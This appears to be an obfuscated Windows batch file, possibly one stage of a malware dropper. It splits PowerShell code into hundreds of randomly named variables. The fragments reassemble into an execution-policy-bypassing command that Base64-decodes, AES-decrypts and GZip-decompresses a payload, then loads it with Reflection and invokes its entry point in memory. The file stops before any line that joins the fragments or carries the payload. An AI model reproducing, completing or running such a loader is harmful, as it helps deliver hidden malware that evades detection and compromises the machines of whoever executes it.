@echo off
set "ncoBbNBGUT=;$Qb"
set "UXGTNbMhID=null"
set "ZgFKCPOCVz=Bmor"
set "FPhyWVhjAr=]::("
set "hvWQeQgyfy=GNVi"
set "UfSazKCeMf=ewLi"
set "XpumeFGnRT=ress"
set "JpnFsxOYHZ=m.Re"
set "xcHwZFrouI=raph"
set "OosVXgxTlM=, (,"
set "IvKtaAMtSV=LBtm"
set "qccMEkwHsd=ect "
set "CMrCiSOkbk=;$bU"
set "sZHVJrviIV=isfL"
set "PZiefFbbFr='[-1"
set "XqPvthiRhE=$CGN"
set "AXXmuQDYPk=Secu"
set "hrxZKmprnT=vert"
set "TAPIuabwHm=[Sys"
set "BABzayqOSj=:('g"
set "sKivWLCoPq=tsWi"
set "cGTGYBjWMS=E.Su"
set "MtIapJZEDo=7Yiv"
set "MmEQpaDiOT=e = "
set "nkRfswqCwl=.Com"
set "ATnjsoNUpF=('l0"
set "eamfJAVkKf=yTo("
set "jEpUVBCjry=fore"
set "ObklzgtkDT=3); "
set "sWsMzeSBJF=-Obj"
set "SfXcpdcmCz=pose"
set "nxqyOJMTPt=-1.."
set "WKvcImpNbp=.Ass"
set "twoFzLXaTn=Invo"
set "XhYjQoqhRG=V = "
set "YphbzjlTFW=();$"
set "XVklzHhdmq='txe"
set "dANGIkzkfE=t Sy"
set "aPIvzYQCGa=]::("
set "CfFYLDIEhW=RFyS"
set "pgcKjuypZo=RFyS"
set "nEbrQClFCO=stem"
set "wUqmsoumgm=S.Pa"
set "imXBmoXrBk=y]::"
set "IprWrofKEZ=stem"
set "SfTKdcKIcZ=urit"
set "PlmORSwrOz=..-1"
set "XtBWvddGJy=j = "
set "sPUxkzPUoX=New-"
set "VZYtLgbgmx=ddin"
set "phIAohhtGu=Syst"
set "iiZINBFFYI=;$bU"
set "njcgDpNUQZ=si.T"
set "iGrrxhbMEJ=g = "
set "jBgCFeJQdk=ddin"
set "OHfcdJSLSA=Disp"
set "lyfSGdFPlL=nJ ="
set "aZMiVTURVQ=ose("
set "ENPBqExXDd=.Mem"
set "dQdbpnJwxV=3HWs"
set "jBDyOYLreP=oL'["
set "FvsWehICPX=tion"
set "TFdeszFzpS=yste"
set "WohMudrEci=qsi "
set "EJJALadKPD=grap"
set "cvplMPUgMW=).Sp"
set "HcsCVVdyFe=ne);"
set "gDfiKRGkMB=gnir"
set "GohwOsKevt=$bUq"
set "NJKSSyNhJD=F'[-"
set "zgGBjVDDnE=ptog"
set "PGuiJNcvuT=('%*'"
set "LcuUfilFcW=OyzA"
set "WIsDVyXlZT=LBtm"
set "HhmjZCUGYd=-nop"
set "AZLbNTCUcK=pres"
set "VmQyDIZNDk=Comp"
set "NJomqhdwEl=bjec"
set "bYRMMuJwcU=ct S"
set "UohOtlegZy=esaB"
set "HxkTFjGmSu=Stre"
set "DxpLjnSCzy=ew-O"
set "FnmesepKov=.Cry"
set "LMDcMmYtOL=ay()"
set "PURjubzrfZ=.Mod"
set "osRzeWOyFu=j, 0"
set "NJfVhKxHeP=.Dis"
set "bezwdMBjOr= New"
set "BdTtkErnFt=yS.I"
set "dBSFHwgrdF=ptor"
set "MAlnPzSxLP=6] -"
set "YCCTOYcvRb=1] -"
set "WjtWDPsALf=ispo"
set "CoKpxvPDsl=New-"
set "yrPDlYQLeE=qsi."
set "cOUhzvUWJc=ose("
set "BLtqcQbbqh=Btmj"
set "VOONNVIQsU=join"
set "mtpGnwbPTQ=Comp"
set "VdvINGNsbo=)) {"
set "NSXZVKOrtA=pher"
set "tbAolxhxTP=KOfR"
set "YXLIiZCQbc=J) {"
set "HSfUCzdHcI=ecry"
set "zFdSLvAgep='')("
set "OjuMVkMugR=FH.T"
set "DKJZOjwpny=$GTF"
set "HIWTCTMxHE=tem."
set "VaeyLwMwXU=eam("
set "zsTBDWiWwV=();$"
set "UBqxBsRKCC=gth)"
set "iMeEveQcIX=rhVZ"
set "qAKytNpSMG=saBm"
set "wzpLqVSjzs=ionM"
set "yqDDunAGVo=ke($"
set "PXywjypEOc=flec"
set "pXQuCBqjim=$GTF"
set "feIwzIdDSr=l = "
set "asizCPBUpM=$LBt"
set "PsIdYKnKOT=[-1."
set "qVOYZjIeeI=fRE."
set "tGhMEFXmys=TFFH"
set "asxjGjfHiU=pDZz"
set "sJSoOjXlEl=i = "
set "DFnLWrULVt=n ''"
set "VEHsSzhiAX=.-16"
set "qwtfSWiWki=sGUc"
set "XBTPZGXFGG=TllA"
set "NcHkIdNhED=[IO."
set "oYfzakxuqP=Syst"
set "KCTogGpebi=rt]:"
set "fONYPIAuIm=LBtm"
set "ZMKKwDPIIy=);$C"
set "bHYBelMrFr=;$pA"
set "jKByzgpLMA=CGNV"
set "NEGbGHQtFh=d;$k"
set "zPQNDPHPUY=y.En"
set "GLiLBjNagZ=esFX"
set "ZYGaVvtqzs=ment"
set "XyyKTIBmlR=]::C"
set "VsJZAHmRaB=BC;$"
set "NqOMoPrcCh=QbMf"
set "IapVvoPHnw=RFyS"
set "hzoGucClvj=Secu"
set "iFaVropzgj=trea"
set "mtGvPxRMES=yste"
set "oLFSzEfgru=);$G"
set "wKCURuAhlo=iron"
set "MnQCvvtOhf= = $"
set "xORPUpqqlr=oint"
set "zkQVlrhRlD=raph"
set "htNnHWFpjb=in $"
set "jqkaxGQDxP=and "
set "gEghPCjzQo=-joi"
set "ROVcOnaThV=1..-"
set "fxlzJLZQLw=RFyS"
set "AFplLabEFz=.Cre"
set "HifjuZbMSS=O.Me"
set "RVhtDtXOKj=]::N"
set "dnIczrKwch=pStr"
set "FWmrUNGlcN=ateD"
set "DPxLgjOawC=kRFy"
set "cmjQXiVDav=.Cry"
set "rXCbMSlWIg= = $"
set "hsDUdkyGHv='gni"
set "AkcrqfQCOO=m(, "
set "OYAEpAXiit=ZYYc"
set "inRONUgIAB=)))"
set "IReWwgTWea=am;$"
set "ibgmnmJecl==');"
set "dvVKSxTlMO=ypto"
set "oiraCWApAX===')"
set "nShRgJadBW=Fo7l"
set "PxYvlUaUjg=cUOn"
set "DITASeVsyq=..-1"
set "IAIRxETreC=UGTu"
set "YwZpYNqutg=Fina"
set "kDjzJXRGAI=oin "
set "PVvahiapwZ=)($v"
set "imzSVnIZUp=.Len"
set "JjHRveiMbJ=tem."
set "VrdXPFEnOY= = ["
set "sIGtGkpLXL=)($L"
set "VPOtSGjYcR=.Dis"
set "yxXKRCMMmD=);$k"
set "QYeMulefef=Disp"
set "iJJoMsZoUZ=tS46"
set "gIrzBuCMsO=bstr"
set "EgUkyUSypT= [st"
set "kQmRKgDMhz=S46e"
set "JpHMtEZIgH=FH);"
set "tOogYHWwsM=Star"
set "hXGPkVfcIO=join"
set "eBcSBIuqak=);$k"
set "neTZNXoGXn=[Sys"
set "dRGqZYQmBl=.GZi"
set "cptQHSjwVQ=fl, "
set "jHsTItQeoZ=yste"
set "nuUzVVzebC=NQeq"
set "ZNJrGDTzuL=m.IO"
set "mHIwtILyhE=rity"
set "uOOOXRybYk=$kRF"
set "vfZEzijDQU=lit("
set "CFFpYUmjnq=y.Ci"
set "JcOSXzcqzE=$cUO"
set "ahvQUjCECv=em.I"
set "QGjrgpsdBW=e]::"
set "ZizXORWZDI=orF'"
set "ZZssQcLfPY=tryP"
set "VWOaRAYdBi=Vi.D"
set "jyWovfYWis=nage"
set "nFUhIwWeiH=comp"
set "MIQlCXlcIf=morF"
set "DLtyguRaEp=();$"
set "EqXgdenRSY=-ep "
set "YHlSiJtubP=$QbM"
set "DMyLxBhOyW=;$xr"
set "WisKaJpimk=bypa"
set "pyjFaqQYeY=fRE "
set "yenGHyTOLa=ss -"
set "kpEaRyXZcp=, $L"
set "BlkNiweCaR=+hAO"
set "rTCCyojqRF=comm"
set "FzyZmJaVRM=ck($"
set "FWhXLNXSSE=Mfl."
set "KOcRlJOMlU= [Sy"
set "gEjgpQGrjw=form"
set "GQDKqcvleb=[Sys"
set "mUrJNiRTWl=6esa"
set "mqBghVZajf=ion."
set "YQspzkYIFo=[]] "
set "HtpNjFssuR=  $v"
set "MDqPkRFwDV=v4Ir"
set "GovJAvTwgW=$GTF"
set "pTvOseBeDX=pAgO"
set "ikNdbGMLwR=vj0m"
set "VvyInmPEXI=Conv"
set "angCQJLAVj=);$x"
set "AmddhqzZqt=se()"
set "sFJvvTWqZW=16] "
set "mDkoxmTGnx=ing("
set "nRrMfqXrgP=onve"
set "qTRKdtQTMo=mory"
set "PUhJvwPvRy=ring"
set "OuNbEPGzTm=.Cop"
set "mSRmuKksuu=.IO."
set "lwcKgqBcXq=hVZ."
